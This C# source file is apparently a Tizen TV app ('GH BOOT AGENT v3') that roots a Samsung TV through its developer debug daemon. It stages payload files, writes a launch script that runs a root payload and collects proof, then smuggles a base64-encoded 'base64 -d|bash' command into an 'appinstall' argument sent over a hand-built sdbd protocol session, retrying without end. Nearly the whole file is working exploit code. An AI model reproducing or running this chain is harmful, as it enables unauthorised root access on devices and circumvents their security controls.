using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Tizen.NUI;
using Tizen.NUI.BaseComponents;

public static class GhUIAgent
{
    // === v3: sdbd localhost route (proven), infinite retry, version stamp ===
    private const string BuildTime = "2026-10-09T16:05Z";

    private const string Res = "/opt/usr/apps/com.samsung.tv.ghservice/res/selfroot";
    private const string AppHome = "/tmp/selfroot-app";
    private const string Pkg = "archive-root-00b0000000000001";
    private const string Staging = "/home/owner/share/tmp/sdk_tools/" + Pkg;
    private const string OnDemand = "/home/owner/share/tmp/sdk_tools/on-demand";
    private const string Evidence = "/home/owner/share/tmp/sdk_tools/selfroot-evidence";
    private const string Mark = "/tmp/selfroot";

    private static readonly object Gate = new object();
    private static readonly List<string> Events = new List<string>();
    private static double Progress = 0.0;
    private static string Banner = "BOOT AGENT v3";
    private static Color BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
    private static bool Done;

    private static TextLabel BannerLabel;
    private static TextLabel VersionLabel;
    private static TextLabel[] Lines = new TextLabel[11];
    private static View Bar;
    private static readonly string[] Last = new string[11];

    public static void Note(string text, double p)
    {
        lock (Gate)
        {
            Events.Add("[" + DateTime.UtcNow.ToString("HH:mm:ss") + "] " + text);
            Progress = p;
        }
    }
    public static void Note(string text) { Note(text, 0); }

    private class Agent : NUIApplication
    {
        protected override void OnCreate()
        {
            base.OnCreate();
            GhUIAgent.BuildUi();
            GhUIAgent.RunChain();
        }
    }

    private static string SelfRev()
    {
        try
        {
            var path = typeof(GhUIAgent).Assembly.Location;
            using (var sha = SHA256.Create())
            using (var stream = File.OpenRead(path))
            {
                var hash = sha.ComputeHash(stream);
                var sb = new StringBuilder();
                for (int i = 0; i < 6; i++) sb.Append(hash[i].ToString("x2"));
                return sb.ToString();
            }
        }
        catch (Exception e) { return "rev-err:" + e.GetType().Name; }
    }

    public static void BuildUi()
    {
        var w = Window.Instance;
        w.BackgroundColor = new Color(0f, 0f, 0f, 1f);
        w.Title = "GH BOOT AGENT v3";

        BannerLabel = new TextLabel
        {
            Text = Banner,
            PointSize = 40,
            TextColor = BannerColor,
            Position2D = new Position2D(120, 80),
            Size2D = new Size2D(1680, 56),
        };
        w.Add(BannerLabel);

        VersionLabel = new TextLabel
        {
            Text = "v3 build " + BuildTime + " rev " + SelfRev(),
            PointSize = 15,
            TextColor = new Color(0.45f, 0.45f, 0.5f, 1f),
            Position2D = new Position2D(120, 142),
            Size2D = new Size2D(1680, 26),
        };
        w.Add(VersionLabel);

        var hint = new TextLabel
        {
            Text = "self-root: Developer Mode Host PC IP = 127.0.0.1 (agent retries forever)",
            PointSize = 16,
            TextColor = new Color(0.6f, 0.6f, 0.6f, 1f),
            Position2D = new Position2D(120, 176),
            Size2D = new Size2D(1680, 28),
        };
        w.Add(hint);

        var bgBar = new View
        {
            BackgroundColor = new Color(0.15f, 0.15f, 0.15f, 1f),
            Position2D = new Position2D(120, 218),
            Size2D = new Size2D(1680, 22),
        };
        w.Add(bgBar);

        Bar = new View
        {
            BackgroundColor = new Color(0.2f, 0.9f, 0.3f, 1f),
            Position2D = new Position2D(120, 218),
            Size2D = new Size2D(0, 22),
        };
        w.Add(Bar);

        for (int i = 0; i < Lines.Length; i++)
        {
            Lines[i] = new TextLabel
            {
                Text = "",
                PointSize = 18,
                TextColor = new Color(0.9f, 0.9f, 0.9f, 1f),
                Position2D = new Position2D(120, 264 + i * 34),
                Size2D = new Size2D(1680, 32),
            };
            w.Add(Lines[i]);
        }

        var timer = new Tizen.NUI.Timer(300);
        timer.Tick += OnTick;
        timer.Start();
    }

    private static bool OnTick(object sender, Tizen.NUI.Timer.TickEventArgs e)
    {
        List<string> pending = null;
        double progress;
        string banner;
        Color bannerColor;
        bool done;
        lock (Gate)
        {
            if (Events.Count > 0)
            {
                pending = new List<string>(Events);
                Events.Clear();
            }
            progress = Progress;
            banner = Banner;
            bannerColor = BannerColor;
            done = Done;
        }
        if (pending != null)
        {
            foreach (var text in pending)
            {
                for (int i = 0; i < Last.Length - 1; i++) Last[i] = Last[i + 1];
                Last[Last.Length - 1] = text;
            }
            for (int i = 0; i < Lines.Length; i++) Lines[i].Text = Last[i] ?? "";
        }
        if (BannerLabel.Text != banner) BannerLabel.Text = banner;
        if (bannerColor != BannerLabel.TextColor) BannerLabel.TextColor = bannerColor;
        var width = (int)(1680 * progress);
        Bar.Size2D = new Size2D(width, 22);
        return !done;
    }

    public static void RunChain()
    {
        Task.Run(() =>
        {
            try
            {
                Directory.CreateDirectory(Mark);
                Directory.CreateDirectory(AppHome);

                var status = new StringBuilder();
                foreach (var line in File.ReadAllLines("/proc/self/status"))
                {
                    if (line.StartsWith("Name:", StringComparison.Ordinal)
                        || line.StartsWith("Uid:", StringComparison.Ordinal)
                        || line.StartsWith("Cap", StringComparison.Ordinal))
                    {
                        status.Append(line.Trim()).Append(' ');
                    }
                }
                try
                {
                    status.Append("label=")
                        .Append(File.ReadAllText("/proc/self/attr/current").Trim()).Append(' ');
                }
                catch { }
                Note("agent v3 boot - " + status, 0.02);

                foreach (var name in new[]
                {
                    "SamsungTvArchiveRoot.dll",
                    "SamsungTvArchiveRoot.runtimeconfig.json",
                    "public.pem",
                    "passwd",
                    Pkg + ".tar.gz",
                    Pkg + ".tar.gz.signature",
                })
                {
                    File.Copy(System.IO.Path.Combine(Res, name), System.IO.Path.Combine(AppHome, name), true);
                }
                Note("staged chain artifacts -> " + AppHome, 0.05);

                var outer = new StringBuilder()
                    .Append("#!/bin/sh\n")
                    .Append("EV=").Append(Evidence).Append("\n")
                    .Append("mkdir -p \"$EV\" 2>/dev/null\n")
                    .Append("{\n")
                    .Append("  date\n")
                    .Append("  id\n")
                    .Append("  cat /proc/self/attr/current\n")
                    .Append("  cp ").Append(AppHome).Append("/SamsungTvArchiveRoot.dll ")
                        .Append(AppHome).Append("/SamsungTvArchiveRoot.runtimeconfig.json ")
                        .Append(AppHome).Append("/public.pem ")
                        .Append(AppHome).Append("/passwd ").Append(Staging).Append("/\n")
                    .Append("  cp ").Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz ")
                        .Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz.signature ")
                        .Append(OnDemand).Append("/\n")
                    .Append("  /usr/bin/dotnet ").Append(Staging)
                        .Append("/SamsungTvArchiveRoot.dll ").Append(Pkg)
                        .Append(' ').Append(Staging).Append(' ').Append(OnDemand).Append('\n')
                    .Append("  echo payload-exit=$?\n")
                    .Append("  sleep 3\n")
                    .Append("  cp /tmp/selfroot-proof.txt \"$EV/selfroot-proof.txt\" 2>/dev/null\n")
                    .Append("  cp /tmp/archive-root-").Append(Pkg).Append(".log \"$EV/payload.log\" 2>/dev/null\n")
                    .Append("  cp ").Append(Mark).Append("/sdb-client.log \"$EV/sdb-client.log\" 2>/dev/null\n")
                    .Append("  echo \"--- evidence ---\"\n")
                    .Append("  ls -la \"$EV\"\n")
                    .Append("} > \"$EV/outer.log\" 2>&1\n")
                    .Append("chsmack -a _ \"$EV\"/* 2>/dev/null\n");
                File.WriteAllText(AppHome + "/selfroot-launch.sh", outer.ToString());
                Note("outer script staged (cat|bash, UEP-safe)", 0.08);

                var token = "app" + ((uint)Environment.TickCount).ToString("x8");
                var wrapped = "/bin/mkdir /tmp/s-" + token + " 2>/dev/null&&{ cat "
                    + AppHome + "/selfroot-launch.sh|bash;}";
                var encoded = Convert.ToBase64String(Encoding.ASCII.GetBytes(wrapped));
                var argument = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}"
                    + encoded + "|base64${IFS}-d|bash`.tpk";
                Note("injection armed (" + argument.Length + "/510 bytes)", 0.10);
                if (argument.Length > 510) throw new Exception("injection too big");

                lock (Gate)
                {
                    Banner = "WAITING FOR SDBD (127.0.0.1)";
                    BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
                }

                // v3: infinite retry - the flip itself is the trigger
                Socket s = null;
                int attempt = 0;
                while (true)
                {
                    attempt++;
                    lock (Gate) { Progress = 0.12; }
                    if (attempt == 1 || attempt % 30 == 0)
                    {
                        Note("retry " + attempt + " - flip Host PC IP to 127.0.0.1 to self-root", 0.12);
                    }
                    if (TrySession(out s)) break;
                    Thread.Sleep(10000);
                }

                lock (Gate)
                {
                    Banner = "SDBD SESSION OPEN";
                    BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
                    Progress = 0.35;
                }
                Note("sdbd answered localhost handshake (attempt " + attempt + ")", 0.35);

                using (s)
                {
                    s.Send(Frame("OPEN", 0x10, 0, Encoding.ASCII.GetBytes("capability:\0")));
                    string c; uint a0, a1; byte[] p;
                    int guard = 0;
                    while (guard++ < 6)
                    {
                        if (!ReadFrame(s, out c, out a0, out a1, out p)) break;
                        if (c == "OKAY") { s.Send(Frame("OKAY", 0x10, a0, new byte[0])); break; }
                        if (c == "CLSE") break;
                    }
                    Note("capability handshake done", 0.45);

                    var service = Encoding.ASCII.GetBytes("shell:" + argument + "\0");
                    s.Send(Frame("OPEN", 0x12, 0, service));
                    Note("injection fired via appinstall shell", 0.60);

                    var deadline = DateTime.UtcNow.AddSeconds(25);
                    var sawOkay = false;
                    while (DateTime.UtcNow < deadline)
                    {
                        if (!ReadFrame(s, out c, out a0, out a1, out p)) break;
                        if (c == "OKAY") { sawOkay = true; s.Send(Frame("OKAY", 0x12, a0, new byte[0])); }
                        if (c == "CLSE") break;
                    }
                    Note("shell accepted=" + sawOkay, 0.70);
                }

                lock (Gate)
                {
                    Banner = "ROOT CHAIN RUNNING";
                    BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
                }

                for (int i = 0; i < 40; i++)
                {
                    Thread.Sleep(3000);
                    bool proof = false;
                    try { proof = File.Exists(Evidence + "/selfroot-proof.txt"); } catch { }
                    lock (Gate) { Progress = 0.70 + 0.29 * (i / 40.0); }
                    if (i % 4 == 0) Note("polling for proof " + (i + 1) + "/40", 0.70 + 0.29 * (i / 40.0));
                    if (proof)
                    {
                        try
                        {
                            Note("PROOF:\n" + File.ReadAllText(Evidence + "/selfroot-proof.txt"), 1.0);
                        }
                        catch { }
                        lock (Gate)
                        {
                            Banner = "ROOT ACQUIRED - UNTETHERED";
                            BannerColor = new Color(0.2f, 1f, 0.3f, 1f);
                            Done = true;
                            Progress = 1.0;
                        }
                        return;
                    }
                }
                lock (Gate)
                {
                    Banner = "NO PROOF AFTER 2 MIN - WILL RETRY NEXT BOOT";
                    BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                    Done = true;
                }
            }
            catch (Exception e)
            {
                lock (Gate)
                {
                    Banner = "AGENT ERROR";
                    BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                    Done = true;
                }
                Note("EXCEPTION " + e.GetType().Name + ": " + e.Message, 0);
            }
        });
    }

    private static byte[] Frame(string cmd, uint arg0, uint arg1, byte[] data)
    {
        var c = Encoding.ASCII.GetBytes(cmd);
        uint check = 0;
        foreach (var b in data) check += b;
        var frame = new byte[24 + data.Length];
        Array.Copy(c, 0, frame, 0, 4);
        Array.Copy(BitConverter.GetBytes(arg0), 0, frame, 4, 4);
        Array.Copy(BitConverter.GetBytes(arg1), 0, frame, 8, 4);
        Array.Copy(BitConverter.GetBytes((uint)data.Length), 0, frame, 12, 4);
        Array.Copy(BitConverter.GetBytes(check), 0, frame, 16, 4);
        Array.Copy(BitConverter.GetBytes(~BitConverter.ToUInt32(c, 0)), 0, frame, 20, 4);
        Array.Copy(data, 0, frame, 24, data.Length);
        return frame;
    }

    private static readonly byte[] Cnxn =
    {
        0x43, 0x4e, 0x58, 0x4e, 0x00, 0x00, 0x10, 0x00,
        0x00, 0x00, 0x04, 0x00, 0x07, 0x00, 0x00, 0x00,
        0x32, 0x02, 0x00, 0x00, 0xbc, 0xb1, 0xa7, 0xb1,
        0x68, 0x6f, 0x73, 0x74, 0x3a, 0x3a, 0x00
    };

    private static int ReadExact(Socket s, byte[] buffer, int needed)
    {
        int got = 0;
        while (got < needed)
        {
            int n;
            try { n = s.Receive(buffer, got, needed - got, SocketFlags.None); }
            catch { return got; }
            if (n <= 0) return got;
            got += n;
        }
        return got;
    }

    private static bool ReadFrame(Socket s, out string cmd, out uint arg0, out uint arg1, out byte[] payload)
    {
        cmd = null; arg0 = 0; arg1 = 0; payload = new byte[0];
        var header = new byte[24];
        if (ReadExact(s, header, 24) < 24) return false;
        cmd = Encoding.ASCII.GetString(header, 0, 4);
        arg0 = BitConverter.ToUInt32(header, 4);
        arg1 = BitConverter.ToUInt32(header, 8);
        uint len = BitConverter.ToUInt32(header, 12);
        payload = new byte[len];
        if (len > 0) ReadExact(s, payload, (int)Math.Min(len, 8192));
        return true;
    }

    private static bool TrySession(out Socket s)
    {
        s = null;
        try
        {
            s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
                ReceiveTimeout = 10000, SendTimeout = 10000
            };
            s.Connect("127.0.0.1", 26101);
            s.Send(Cnxn);
            string c; uint a0, a1; byte[] p;
            if (!ReadFrame(s, out c, out a0, out a1, out p))
            {
                s.Close(); s = null; return false;
            }
            return true;
        }
        catch
        {
            if (s != null) { try { s.Close(); } catch { } }
            return false;
        }
    }

    public static void Main(string[] args)
    {
        new Agent().Run(args);
    }
}